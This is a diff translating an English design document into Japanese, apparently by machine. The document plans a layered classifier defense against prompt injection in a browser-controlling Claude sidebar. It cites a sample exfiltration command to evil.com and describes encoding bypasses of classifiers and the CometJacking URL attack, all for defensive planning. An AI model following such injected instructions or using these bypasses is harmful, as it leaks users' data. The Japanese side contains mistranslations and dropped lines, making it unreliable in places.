@@ -1,108 +1,108 @@
-# ML Prompt Injection Killer
+# ML 即時注入キラー
 
-**Status:** P0 TODO (follow-up to sidebar security fix PR)
-**Branch:** garrytan/extension-prompt-injection-defense
-**Date:** 2026-03-28
-**CEO Plan:** ~/.gstack/projects/garrytan-gstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md
+**ステータス:** P0 TODO (サイドバーのセキュリティ修正 PR のフォローアップ)
+**ブランチ:** garrytan/extension-prompt-injection-defense
+**日付:** 2026-03-28
+**CEO 計画:** ~/.gstack/projects/garrytan-gstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md
 
-## The Problem
+＃＃ 問題
 
-The gstack Chrome extension sidebar gives Claude bash access to control the browser.
-A prompt injection attack (via user message, page content, or crafted URL) can hijack
-Claude into executing arbitrary commands. PR 1 fixes this architecturally (command
-allowlist, XML framing, Opus default). This design doc covers the ML classifier layer
-that catches attacks the architecture can't see.
+gstack Chrome 拡張機能サイドバーにより、Claude bash にブラウザーを制御するためのアクセス権が与えられます。
+プロンプト インジェクション攻撃 (ユーザー メッセージ、ページ コンテンツ、または細工された URL 経由) によりハイジャックされる可能性があります。
+クロードに任意のコマンドを実行させる。 PR 1 はこれをアーキテクチャ的に修正します (コマンド
+ホワイトリスト、XML フレーミング、Opus のデフォルト）。この設計ドキュメントでは、ML 分類子レイヤーについて説明します。
+アーキテクチャが認識できない攻撃をキャッチします。
 
-**What the command allowlist doesn't catch:** An attacker can still trick Claude into
-navigating to phishing sites, clicking malicious elements, or exfiltrating data visible
-on the current page via browse commands. The allowlist prevents `curl` and `rm`, but
-`$B goto https://evil.com/steal?data=...` is a valid browse command.
+**コマンド ホワイトリストで捕捉できないもの:** 攻撃者は依然としてクロードを騙すことができます。
+フィッシング サイトへの移動、悪意のある要素のクリック、または表示されているデータの流出
+参照コマンドを使用して現在のページにアクセスします。ホワイトリストでは `curl` と `rm` が禁止されていますが、
+`$B goto https://evil.com/steal?data=...` は有効な参照コマンドです。
 
-## Industry State of the Art (March 2026)
+## 業界の最先端 (2026 年 3 月)
 
-| System | Approach | Result | Source |
+|システム |アプローチ | Result |出典 |
 |--------|----------|--------|--------|
-| Claude Code Auto Mode | Two-layer: input probe scans tool outputs, transcript classifier (Sonnet 4.6, reasoning-blind) runs on every action | 0.4% FPR, 5.7% FNR | [Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode) |
-| Perplexity BrowseSafe | ML classifier (Qwen3-30B-A3B MoE) + input normalization + trust boundaries | F1 ~0.91, but Lasso Security bypassed 36% with encoding tricks | [Perplexity Research](https://research.perplexity.ai/articles/browsesafe), [Lasso](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks) |
-| Perplexity Comet | Defense-in-depth: ML classifiers + security reinforcement + user controls + notifications | CometJacking still worked via URL params | [Perplexity](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet), [LayerX](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/) |
-| Meta Rule of Two | Architectural: agent must satisfy max 2 of {untrusted input, sensitive access, state change} | Design pattern, not a tool | [Meta AI](https://ai.meta.com/blog/practical-ai-agent-security/) |
-| ProtectAI DeBERTa-v3 | Fine-tuned 86M param binary classifier for prompt injection | 94.8% accuracy, 99.6% recall, 90.9% precision | [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) |
-| tldrsec | Curated defense catalog: instructional, guardrails, firewalls, ensemble, canaries, architectural | "Prompt injection remains unsolved" | [GitHub](https://github.com/tldrsec/prompt-injection-defenses) |
-| Multi-Agent Defense | Pipeline of specialized agents for detection | 100% mitigation in lab conditions | [arXiv](https://arxiv.org/html/2509.14285v4) |
+|クロードコードオートモード | 2 層: 入力プローブ スキャン ツール出力、トランスクリプト分類子 (Sonnet 4.6、推論ブラインド) がすべてのアクションで実行されます。 0.4% FPR、5.7% FNR | [Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode) |
+| Perplexity BrowseSafe | ML 分類器 (Qwen3-30B-A3B MoE) + 入力正規化 + 信頼境界 | F1 ~0.91 ですが、Lasso Security はエンコード トリックにより 36% を回避しました。 [パープレキシティリサーチ](https://research.perplexity.ai/articles/browsesafe)、[なげなわ](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks) |
+|パープレキシティ彗星 |多層防御: ML 分類子 + セキュリティ強化 + ユーザー制御 + 通知 | CometJacking still worked via URL params | [パープレキシティ](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet)、[レイヤーX](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/) |
+| 2 つのメタ ルール |アーキテクチャ: エージェントは、{信頼できない入力、機密性の高いアクセス、状態変更} の最大 2 つを満たす必要があります。 Design pattern, not a tool | [Meta AI](https://ai.meta.com/blog/practical-ai-agent-security/) |
+| ProtectAI DeBERTa-v3 |プロンプトインジェクションのための微調整された 86M param バイナリ分類子 | 94.8% accuracy, 99.6% recall, 90.9% precision | [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) |
+| tldrsec |厳選された防御カタログ: 教育、ガードレール、ファイアウォール、アンサンブル、カナリア、建築 | "Prompt injection remains unsolved" | [GitHub](https://github.com/tldrsec/prompt-injection-defenses) |
+|マルチエージェント防御 | Pipeline of specialized agents for detection | 100% mitigation in lab conditions | [arXiv](https://arxiv.org/html/2509.14285v4) |
 
-**Key insights:**
-- Claude Code auto mode's transcript classifier is **reasoning-blind** by design. It
-  sees user messages + tool calls but strips Claude's own reasoning, preventing
-  self-persuasion attacks.
-- Perplexity concluded: "LLM-based guardrails cannot be the final line of defense.
-  Need at least one deterministic enforcement layer."
-- BrowseSafe was bypassed 36% of the time with **simple encoding techniques** (base64,
-  URL encoding). Single-model defense is insufficient.
-- CometJacking required zero credentials or user interaction. One crafted URL stole
-  emails and calendar data.
-- The academic consensus (NDSS 2026, multiple papers): prompt injection remains
-  unsolved. Design systems with this in mind, don't assume any filter is reliable.
+**重要な洞察:**
+- クロード コードの自動モードのトランスクリプト分類子は、設計上 **推論ブラインド** になっています。それ
+  ユーザーメッセージとツール呼び出しは表示されますが、クロード自身の推論は削除され、妨げられます。
+  自己説得攻撃。
+- Perplexity は次のように結論付けています。「LLM ベースのガードレールは最終防衛線にはなりません。
+  少なくとも 1 つの決定論的な強制レイヤーが必要です。」
+- BrowseSafe は **単純なエンコード技術** (base64、
+  URLエンコード）。単一モデルの防御では不十分です。
+- CometJacking は資格情報やユーザーの操作を必要としませんでした。 1 つの細工された URL が盗まれました
+  メールやカレンダーのデータ。
+- 学術的なコンセンサス (NDSS 2026、複数の論文): 迅速な注射は継続
+  未解決。これを念頭に置いてシステムを設計し、フィルターが信頼できると想定しないでください。
 
-## Open Source Tools Landscape
+## オープンソース ツールの状況
 
-### Usable Now
+### 今すぐ使える
 
 **1. ProtectAI DeBERTa-v3-base-prompt-injection-v2**
-- [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
-- 86M param binary classifier (injection / no injection)
-- 94.8% accuracy, 99.6% recall, 90.9% precision
-- Has [ONNX variant](https://huggingface.co/protectai/deberta-v3-base-injection-onnx) for fast inference (~5ms native, ~50-100ms WASM)
-- Limitation: doesn't detect jailbreaks, English-only, false positives on system prompts
-- **Our pick for v1.** Small, fast, well-tested, maintained by a security team.
+- [ハグフェイス](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
+- 86M param バイナリ分類器 (注入あり/注入なし)
+- 94.8% の精度、99.6% の再現率、90.9% の精度
+- 高速推論のための [ONNX バリアント](https://huggingface.co/protectai/deberta-v3-base-injection-onnx) を備えています (~5ms ネイティブ、~50-100ms WASM)
+- 制限事項: ジェイルブレイクは検出されません、英語のみ、システム プロンプトでの誤検知
+- **v1 のおすすめ** 小型、高速、十分にテストされ、セキュリティ チームによって保守されています。
 
 **2. Perplexity BrowseSafe**
-- [HuggingFace model](https://huggingface.co/perplexity-ai/browsesafe) + [benchmark dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
-- Qwen3-30B-A3B (MoE), fine-tuned for browser agent injection
-- F1 ~0.91 on BrowseSafe-Bench (3,680 test samples, 11 attack types, 9 injection strategies)
-- **Model too large for local inference** (30B params). But the benchmark dataset is
-  gold for testing our own defenses.
+- [HuggingFace モデル](https://huggingface.co/perplexity-ai/browsesafe) + [ベンチマーク データセット](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
+- Qwen3-30B-A3B (MoE)、ブラウザ エージェント インジェクション用に微調整
+- BrowseSafe-Bench での F1 ~0.91 (3,680 のテスト サンプル、11 の攻撃タイプ、9 つのインジェクション戦略)
+- **ローカル推論にはモデルが大きすぎます** (30B パラメーター)。ただし、ベンチマーク データセットは
+  私たち自身の防御をテストするためのゴールド。
 
-**3. @huggingface/transformers v4**
+**3. @huggingface/トランスフォーマー v4**
 - [npm](https://www.npmjs.com/package/@huggingface/transformers)
-- JavaScript ML inference library. Native Bun support (shipped Feb 2026).
-- WASM backend works in compiled binaries. WebGPU backend for acceleration.
-- Loads DeBERTa ONNX models directly. ~50-100ms inference with WASM.
-- **This is the integration path for the DeBERTa model.**
+- JavaScript ML 推論ライブラリ。ネイティブ Bun のサポート (2026 年 2 月に出荷)。
+- WASM バックエンドはコンパイルされたバイナリで動作します。高速化のための WebGPU バックエンド。
+- DeBERTa ONNX モデルを直接ロードします。 WASM による ~50 ～ 100 ミリ秒の推論。
+- **これは DeBERTa モデルの統合パスです。**
 
 **4. theRizwan/llm-guard (TypeScript)**
 - [GitHub](https://github.com/theRizwan/llm-guard)
-- TypeScript/JS library for prompt injection, PII, jailbreak, profanity detection
-- Small project, unclear maintenance. Needs audit before depending on it.
+- プロンプトインジェクション、PII、脱獄、冒涜検出のための TypeScript/JS ライブラリ
+- 小規模プロジェクト、不明確なメンテナンス。それに依存する前に監査が必要です。
 
-**5. ProtectAI Rebuff**
+**5. ProtectAI 拒否**
 - [GitHub](https://github.com/protectai/rebuff)
-- Multi-layer: heuristics + LLM classifier + vector DB of known attacks + canary tokens
-- Python-based. Architecture pattern is reusable, library is not.
+- マルチレイヤー: ヒューリスティック + LLM 分類器 + 既知の攻撃のベクトル DB + カナリア トークン
+- Python ベース。アーキテクチャ パターンは再利用可能ですが、ライブラリは再利用できません。
 
-**6. ProtectAI LLM Guard (Python)**
+**6. ProtectAI LLM ガード (Python)**
 - [GitHub](https://github.com/protectai/llm-guard)
-- 15 input scanners, 20 output scanners. Mature, well-maintained.
-- Python-only. Would need sidecar process or reimplementation.
+- 15 input scanners, 20 output scanners.成熟した、よく手入れされた。
+- Python のみ。サイドカープロセスまたは再実装が必要になります。
 
-**7. @openai/guardrails**
+**7. @openai/ガードレール**
 - [npm](https://www.npmjs.com/package/@openai/guardrails)
 - OpenAI's TypeScript guardrails. LLM-based injection detection.
-- Requires OpenAI API calls (adds latency, cost, vendor dependency). Not ideal.
+- OpenAI API 呼び出しが必要です (レイテンシー、コスト、ベンダーへの依存関係が追加されます)。理想的ではありません。
 
-### Benchmark Dataset
+### ベンチマーク データセット
 
-**BrowseSafe-Bench** — 3,680 adversarial test cases from Perplexity:
-- 11 attack types with different security criticality levels
-- 9 injection strategies
-- 5 distractor types
-- 5 context-aware generation types
-- 5 domains, 3 linguistic styles, 5 evaluation metrics
-- [Dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
-- Use this to validate our detection rate. Target: >95% detection, <1% false positive.
+**BrowseSafe-Bench** — Perplexity の 3,680 の敵対的テスト ケース:
+- セキュリティ重要度の異なる 11 種類の攻撃
+- 9 つの注入戦略
+- 5種類のディストラクター
+- 5 つのコンテキスト認識型生成タイプ
+- 5 つのドメイン、3 つの言語スタイル、5 つの評価指標
+- [データセット](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
+- これを使用して検出率を検証します。目標: >95% の検出、<1% の偽陽性。
 
-## Architecture
+＃＃ 建築
 
-### Reusable Security Module: `browse/src/security.ts`
+
 
 ```typescript
 // Public API -- any gstack component can call these
@@ -125,21 +125,21 @@ type SecurityResult = {
 type SecurityStatus = 'protected' | 'degraded' | 'inactive'
 ```
 
-### Defense Layers (full vision)
+### 防御層 (フルビジョン)
 
-| Layer | What | How | Status |
-|-------|------|-----|--------|
-| L0 | Model selection | Default to Opus | PR 1 (done) |
-| L1 | XML prompt framing | `<system>` + `<user-message>` with escaping | PR 1 (done) |
-| L2 | DeBERTa classifier | @huggingface/transformers v4 WASM, 94.8% accuracy | **THIS PR** |
-| L2b | Regex patterns | Decode base64/URL/HTML entities, then pattern match | **THIS PR** |
-| L3 | Page content scan | Pre-scan snapshot before prompt construction | **THIS PR** |
-| L4 | Bash command allowlist | Browse-only commands pass | PR 1 (done) |
-| L5 | Canary tokens | Random token per session, check output stream | **THIS PR** |
-| L6 | Transparent blocking | Show user what was caught and why | **THIS PR** |
-| L7 | Shield icon | Security status indicator (green/yellow/red) | **THIS PR** |
+|レイヤー |何を |どのように |ステータス |
+|------|------|-----|----------|
+| L0 |モデルの選択 |デフォルトはオーパス | PR 1 (完了) |
+| L1 | XML プロンプトのフレーム化 | `<system>` + `<user-message>` エスケープ付き | PR 1 (完了) |
+| L2 | DeBERTa 分類器 | @huggingface/transformers v4 WASM、精度 94.8% | **このPR** |
+| L2b |正規表現パターン | Base64/URL/HTML エンティティをデコードし、パターン マッチを実行します。 **このPR** |
+| L3 |ページコンテンツのスキャン |プロンプト構築前の事前スキャンスナップショット | **このPR** |
+| L4 | Bash コマンド許可リスト |参照専用コマンドのパス | PR 1 (完了) |
+| L5 |カナリアトークン |セッションごとにランダムなトークン、出力ストリームを確認します。 **このPR** |
+| L6 |透明なブロッキング |何が捕らえられたのか、そしてその理由をユーザーに表示 | **このPR** |
+| L7 |盾のアイコン | 盾のアイコンセキュリティステータスインジケーター（緑/黄/赤） | **このPR** |
 
-### Data Flow with ML Classifier
+### ML 分類器を使用したデータ フロー
 
 ```
   USER INPUT
@@ -171,9 +171,9 @@ type SecurityStatus = 'protected' | 'degraded' | 'inactive'
                                   KILL SESSION + WARN USER
 ```
 
-### Graceful Degradation
+### グレースフル デグラデーション
 
-The security module NEVER blocks the sidebar from working:
+セキュリティ モジュールはサイドバーの動作を決してブロックしません。
 
 ```
 Model downloaded + loaded  -> Full ML + regex + canary (shield: green)
@@ -183,10 +183,10 @@ Model corrupted            -> Re-download next startup (shield: yellow)
 Security module crashes    -> No check, fall through (shield: red)
 ```
 
-## Encoding Evasion Defense
+## エンコード回避防御
 
-Attackers bypass classifiers using encoding tricks (this is how Lasso bypassed
-BrowseSafe 36% of the time). Our defense: **decode before checking.**
+攻撃者はエンコードトリックを使用して分類器をバイパスします (これが Lasso がバイパスした方法です)
+BrowseSafe は 36% の確率で使用されます)。私たちの弁護: **チェックする前にデコードしてください。**
 
 ```
 Input normalization pipeline (in security.ts):
@@ -198,9 +198,9 @@ Input normalization pipeline (in security.ts):
   6. Run classifier on DECODED input
 ```
 
-This is deterministic. No encoding trick survives full normalization.
+これは決定論的です。 No encoding trick survives full normalization.
 
-## Regex Patterns (deterministic layer)
+## 正規表現パターン (決定層)
 
 ```
 Known injection patterns (case-insensitive):
@@ -211,10 +211,9 @@ Known injection patterns (case-insensitive):
   - </?(system|user-message|instructions?)>  (XML tag injection)
 ```
 
-Action: WARN (not block). Inject `[PROMPT INJECTION WARNING]` marker into prompt.
-Blocking creates false positives. Warning + smart model beats hard blocking.
 
-## Canary Tokens
+
+## カナリアトークン
 
 ```
 In system prompt:
@@ -228,12 +227,12 @@ In output stream checker:
   -> Log attempt
 ```
 
-Detection rate: catches naive exfiltration attempts that try to leak the system prompt.
-Sophisticated attacks avoid this, which is why it's one layer among seven.
+検出率: システム プロンプトを漏洩しようとする単純な漏洩の試みを捕捉します。
+高度な攻撃はこれを回避するため、7 つのレイヤーのうち 1 つのレイヤーになっています。
 
-## Attack Logging + Special Telemetry
+## 攻撃ロギング + 特別なテレメトリー
 
-### Local Logging (always on)
+### ローカルログ (常時オン)
 
 ```json
 // ~/.gstack/security/attempts.jsonl
@@ -247,12 +246,12 @@ Sophisticated attacks avoid this, which is why it's one layer among seven.
 }
 ```
 
-Privacy: payload HASH with random salt (not raw payload). URL domain only. No full paths.
+プライバシー: ランダムソルトを含むペイロード HASH (生のペイロードではない)。 URLドメインのみ。フルパスはありません。
 
-### Special Telemetry (ask even when telemetry is off)
+### 特別なテレメトリ (テレメトリがオフの場合でも尋ねます)
 
-Prompt injection detections in the wild are rare and scientifically valuable. When a
-detection occurs, even if the user has telemetry set to "off":
+野生下で注射が迅速に検出されることはまれであり、科学的に価値があります。とき
+ユーザーがテレメトリを「オフ」に設定している場合でも、検出は行われます。
 
 ```
 AskUserQuestion:
@@ -265,22 +264,22 @@ AskUserQuestion:
   B) No thanks
 ```
 
-This respects user sovereignty while collecting high-signal security events.
+これにより、高信号のセキュリティ イベントを収集する際にユーザーの主権が尊重されます。
 
-Note: The AskUserQuestion happens through the Claude subprocess (which has access to
-AskUserQuestion), not through the extension UI (which doesn't have an ask-user primitive).
+注: AskUserQuestion は、Claude サブプロセス (
+AskUserQuestion)、拡張 UI (ask-user プリミティブがない) 経由ではありません。
 
-## Shield Icon UI
+## シールドアイコン UI
 
-Add to sidebar header:
-- Green shield: all defense layers active (model loaded, allowlist active)
-- Yellow shield: degraded (model not loaded, regex-only)
-- Red shield: inactive (security module error)
+サイドバーのヘッダーに追加:
+- 緑色のシールド: すべての防御層がアクティブ (モデルがロードされ、ホワイトリストがアクティブ)
+- 黄色のシールド: 劣化 (モデルがロードされていない、正規表現のみ)
+- 赤いシールド: 非アクティブ (セキュリティ モジュール エラー)
 
-Implementation: add security state to existing `/health` endpoint (don't create a
-new `/security-status` endpoint). Sidepanel polls `/health` and reads the security field.
+実装: 既存の `/health` エンドポイントにセキュリティ状態を追加します (エンドポイントを作成しないでください)
+新しい `/security-status` エンドポイント)。サイドパネルは `/health` をポーリングし、セキュリティ フィールドを読み取ります。
 
-## BrowseSafe-Bench Red Team Harness
+## BrowseSafe-Bench レッドチーム ハーネス
 
 ### `browse/test/security-bench.test.ts`
 
@@ -296,27 +295,27 @@ new `/security-status` endpoint). Sidepanel polls `/health` and reads the securi
 5. Fail if detection rate < 90% or false positive rate > 5%
 ```
 
-This is also the `/security-test` command users can run anytime.
+これは、ユーザーがいつでも実行できる `/security-test` コマンドでもあります。
 
-## The Ambitious Vision: Bun-Native DeBERTa (~5ms)
+## 野心的なビジョン: Bun-Native DeBERTa (~5ms)
 
-### Why WASM is a stepping stone
 
-The @huggingface/transformers WASM backend gives us ~50-100ms inference. That's fine
-for sidebar input (human typing speed). But for scanning every page snapshot, every
-tool output, every browse command response... 100ms per check adds up.
 
-Claude Code auto mode's input probe runs server-side on Anthropic's infrastructure.
-They can afford fast native inference. We're running on the user's Mac.
+@huggingface/transformers WASM バックエンドは、約 50 ～ 100 ミリ秒の推論を提供します。それでいいよ
+サイドバー入力用 (人間の入力速度)。ただし、すべてのページのスナップショットをスキャンする場合、
+ツールの出力、すべてのブラウズ コマンド応答... チェックごとに 100 ミリ秒が加算されます。
 
-### The 5ms path: port DeBERTa tokenizer + inference to Bun-native
+Claude Code 自動モードの入力プローブは、Anthropic のインフラストラクチャ上のサーバー側で実行されます。
+彼らは高速なネイティブ推論を行うことができます。ユーザーの Mac 上で実行されています。
 
-**Layer 1 approach:** Use onnxruntime-node (native N-API bindings). ~5ms inference.
-Problem: doesn't work in compiled Bun binaries (native module loading fails).
+### 5ms パス: DeBERTa トークナイザーのポート + Bun ネイティブへの推論
 
-**Layer 3 / EUREKA approach:** Port the DeBERTa tokenizer and ONNX inference to pure
-Bun/TypeScript using Bun's native SIMD and typed array support. No WASM, no native
-modules, no onnxruntime dependency.
+**レイヤー 1 アプローチ:** onnxruntime-node (ネイティブ N-API バインディング) を使用します。約 5 ミリ秒の推論。
+問題: コンパイルされた Bun バイナリでは動作しません (ネイティブ モジュールのロードが失敗します)。
+
+**レイヤー 3 / EUREKA アプローチ:** DeBERTa トークナイザーと ONNX 推論を純粋に移植します。
+Bun のネイティブ SIMD および型付き配列のサポートを使用する Bun/TypeScript。 WASMもネイティブもなし
+モジュール、onnxruntime 依存関係なし。
 
 ```
 Components to port:
@@ -347,32 +346,32 @@ Components to port:
      - Bun's FFI for BLAS matmul (Apple Accelerate on macOS)
 ```
 
-**Effort:** XL (human: ~2 months / CC: ~1-2 weeks)
+**労力:** XL (人間: ~2 か月 / CC: ~1 ～ 2 週間)
 
-**Why this might be worth it:**
-- 5ms inference means we can scan EVERYTHING: every message, every page, every tool
-  output, every browse command response. No latency tradeoffs.
-- Zero external dependencies. Pure TypeScript. Works everywhere Bun works.
-- gstack becomes the only open source tool with native-speed prompt injection detection.
-- The tokenizer + inference engine could be published as a standalone package.
+**これに価値がある理由:**
+- 5ms の推論は、すべてのメッセージ、すべてのページ、すべてのツールをスキャンできることを意味します。
+  出力、すべてのブラウズ コマンド応答。遅延のトレードオフはありません。
+- 外部依存性ゼロ。純粋な TypeScript。 Bun が働く場所ならどこでも使えます。
+- gstack は、ネイティブ速度のプロンプト インジェクション検出を備えた唯一のオープン ソース ツールになります。
+- トークナイザー + 推論エンジンはスタンドアロン パッケージとして公開できます。
 
-**Why it might not:**
-- WASM at 50-100ms is probably good enough for the sidebar use case.
-- Maintaining a custom inference engine is a lot of ongoing work.
-- @huggingface/transformers will keep getting faster (WebGPU support is already landing).
-- The 5ms target matters more if we're scanning every tool output, which we're not doing yet.
+**そうならない理由:**
+- サイドバーの使用例には、50 ～ 100 ミリ秒の WASM がおそらく十分です。
+- カスタム推論エンジンの維持は、継続的な多くの作業です。
+- @huggingface/transformers はさらに高速化されます (WebGPU のサポートはすでに開始されています)。
+- すべてのツール出力をスキャンしている場合、5 ミリ秒の目標はより重要になりますが、まだ実行していません。
 
-**Recommended path:**
-1. Ship WASM version (this PR)
-2. Benchmark real-world latency
-3. If latency is a bottleneck, explore Bun FFI + Apple Accelerate for matmul
-4. If that's still not enough, consider the full native port
+**推奨されるパス:**
+1. WASM バージョンの出荷 (この PR)
+2. 現実世界のレイテンシのベンチマーク
+3. 遅延がボトルネックの場合は、Bun FFI + Apple Accelerate for matmul を検討してください
+4. それでも十分でない場合は、完全なネイティブ ポートを検討してください。
 
-### Alternative: Bun FFI + Apple Accelerate (medium effort)
+### 代替案: Bun FFI + Apple Accelerate (中程度の労力)
 
-Instead of porting all of ONNX, use Bun's FFI to call Apple's Accelerate framework
-(vDSP, BLAS) for the matrix multiplies. Keep the tokenizer in TypeScript, keep the
-model weights in Float32Array, but call native BLAS for the heavy math.
+ONNX をすべて移植する代わりに、Bun の FFI を使用して Apple の Accelerate フレームワークを呼び出します
+(vDSP、BLAS) マトリックス乗算用。トークナイザーを TypeScript に保持し、
+Float32Array で重みをモデル化しますが、複雑な計算にはネイティブ BLAS を呼び出します。
 
 ```typescript
 import { dlopen, FFIType } from "bun:ffi";
@@ -385,72 +384,72 @@ const accelerate = dlopen("/System/Library/Frameworks/Accelerate.framework/Accel
 accelerate.symbols.cblas_sgemm(...);
 ```
 
-**Effort:** L (human: ~2 weeks / CC: ~4-6 hours)
-**Result:** ~5-10ms inference on Apple Silicon, pure Bun, no npm dependencies.
-**Limitation:** macOS-only (Linux would need OpenBLAS FFI). But gstack already
-ships macOS-only compiled binaries.
+**労力:** L (人間: ~2 週間 / CC: ~4 ～ 6 時間)
+**結果:** Apple Silicon、純粋な Bun、npm 依存関係なしで約 5 ～ 10 ミリ秒の推論。
+**制限事項:** macOS のみ (Linux には OpenBLAS FFI が必要です)。しかし、gstackはすでに
+macOS 専用のコンパイル済みバイナリが同梱されています。
 
-## Codex Review Findings (from the eng review)
+## Codex レビューの結果 (eng レビューより)
 
-Codex (GPT-5.4) reviewed this plan and found 15 issues. The critical ones that
-apply to this ML classifier PR:
+Codex (GPT-5.4) はこの計画をレビューし、15 の問題を発見しました。重要なものは、
+この ML 分類子 PR に適用します。
 
-1. **Page scan aimed at wrong ingress** — pre-scanning once before prompt construction
-   doesn't cover mid-session content from `$B snapshot`. Consider: also scan tool
-   outputs in the sidebar agent's stream handler, or accept this as a known limitation.
+1. **誤った侵入を目的としたページ スキャン** — プロンプト構築の前に 1 回の事前スキャン
+   `$B snapshot` のセッション中のコンテンツはカバーされていません。検討: スキャンツールも
+   サイドバー エージェントのストリーム ハンドラーで出力するか、これを既知の制限として受け入れます。
 
-2. **Fail-open design** — if the ML classifier crashes, the system reverts to the
-   (already-fixed) architectural controls only. This is intentional: ML is
-   defense-in-depth, not a gate. But document it clearly.
+2. **フェールオープン設計** — ML 分類子がクラッシュすると、システムは元の状態に戻ります。
+   (すでに修正されている) アーキテクチャ コントロールのみ。これは意図的なものです。ML は
+   ゲートではなく多層防御です。ただし、それを明確に文書化してください。
 
-3. **Benchmark non-hermetic** — BrowseSafe-Bench downloads at runtime. Cache the
-   dataset locally so CI doesn't depend on HuggingFace availability.
+3. **非密閉型ベンチマーク** — 実行時に BrowseSafe-Bench をダウンロードします。キャッシュする
+   データセットをローカルに設定するため、CI は HuggingFace の可用性に依存しません。
 
-4. **Payload hash privacy** — add random salt per session to prevent rainbow table
-   attacks on short/common payloads.
+4. **ペイロード ハッシュ プライバシー** — レインボー テーブルを防ぐためにセッションごとにランダム ソルトを追加します
+   短い/一般的なペイロードに対する攻撃。
 
-5. **Read/Glob/Grep tool output injection** — even with Bash restricted, untrusted
-   repo content read via Read/Glob/Grep enters Claude's context. This is a known
-   gap. Out of scope for this PR but should be tracked.
+5. **Read/Glob/Grep ツールの出力インジェクション** — Bash が制限され、信頼されていない場合でも
+   Read/Glob/Grep 経由で読み取られたリポジトリのコンテンツは、Claude のコンテキストに入ります。これは既知のことです
+   ギャップ。この PR の範囲外ですが、追跡する必要があります。
 
-## Implementation Checklist
+## 実装チェックリスト
 
-- [ ] Add `@huggingface/transformers` to package.json
-- [ ] Create `browse/src/security.ts` with full public API
-- [ ] Implement `loadModel()` with download-on-first-use to ~/.gstack/models/
-- [ ] Implement `checkInjection()` with DeBERTa + regex + encoding normalization
-- [ ] Implement `scanPageContent()` (same classifier, different input)
-- [ ] Implement `injectCanary()` + `checkCanary()`
-- [ ] Implement `logAttempt()` with salted hashing
-- [ ] Implement `getStatus()` for shield icon
-- [ ] Integrate into server.ts `spawnClaude()`
-- [ ] Add canary checking to sidebar-agent.ts output stream
-- [ ] Add shield icon to sidepanel.js
-- [ ] Add blocking message UI to sidepanel.js
-- [ ] Add security state to /health endpoint
-- [ ] Implement special telemetry (AskUserQuestion on detection)
-- [ ] Create browse/test/security.test.ts (unit + adversarial)
-- [ ] Create browse/test/security-bench.test.ts (BrowseSafe-Bench harness)
-- [ ] Cache BrowseSafe-Bench dataset for offline CI
-- [ ] Add `test:security-bench` script to package.json
-- [ ] Update CLAUDE.md with security module documentation
+- [ ] package.jsonに`@huggingface/transformers`を追加します
+- [ ] 完全なパブリック API を使用して `browse/src/security.ts` を作成します
+- [ ] 初回使用時ダウンロードを使用して `loadModel()` を ~/.gstack/models/ に実装します
+- [ ] DeBERTa + regex + エンコーディング正規化を使用して `checkInjection()` を実装します
+- [ ] `scanPageContent()` を実装します (同じ分類子、異なる入力)
+- [ ] `injectCanary()` + `checkCanary()` を実装します
+- [ ] ソルテッドハッシュを使用して `logAttempt()` を実装する
+- [ ] 盾アイコンに`getStatus()`を実装
+- [ ]server.ts `spawnClaude()` に統合します
+- [ ] カナリアチェックをsidebar-agent.ts出力ストリームに追加します。
+- [ ] 盾アイコンをsidepanel.jsに追加します。
+- [ ] ブロッキング メッセージ UI をsidepanel.js に追加します。
+- [ ] セキュリティ状態を /health エンドポイントに追加します
+- [ ] 特別なテレメトリを実装します (検出時に AskUserQuestion)
+- [ ]browse/test/security.test.ts (ユニット + 敵対的) を作成します。
+- [ ] Browse/test/security-bench.test.ts (BrowseSafe-Bench ハーネス) を作成します。
+- [ ] オフライン CI の BrowseSafe-Bench データセットをキャッシュします
+- [ ] `test:security-bench` スクリプトを package.json に追加します
+- [ ] セキュリティ モジュールのドキュメントを使用して CLAUDE.md を更新します
 
-## References
+## 参考文献
 
-- [Claude Code Auto Mode](https://www.anthropic.com/engineering/claude-code-auto-mode)
-- [Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
-- [BrowseSafe Paper](https://research.perplexity.ai/articles/browsesafe)
-- [BrowseSafe Model](https://huggingface.co/perplexity-ai/browsesafe)
-- [BrowseSafe-Bench Dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
-- [CometJacking](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/)
-- [Mitigating Prompt Injection in Comet](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet)
-- [Red Teaming BrowseSafe](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks)
-- [Meta Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/)
-- [Auto Mode Analysis (Simon Willison)](https://simonwillison.net/2026/Mar/24/auto-mode-for-claude-code/)
-- [Prompt Injection Defenses (tldrsec)](https://github.com/tldrsec/prompt-injection-defenses)
-- [DeBERTa-v3-base-prompt-injection-v2](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
-- [DeBERTa ONNX variant](https://huggingface.co/protectai/deberta-v3-base-injection-onnx)
+- [クロードコードオートモード](https://www.anthropic.com/engineering/claude-code-auto-mode)
+- [クロードコードサンドボックス](https://www.anthropic.com/engineering/claude-code-sandboxing)
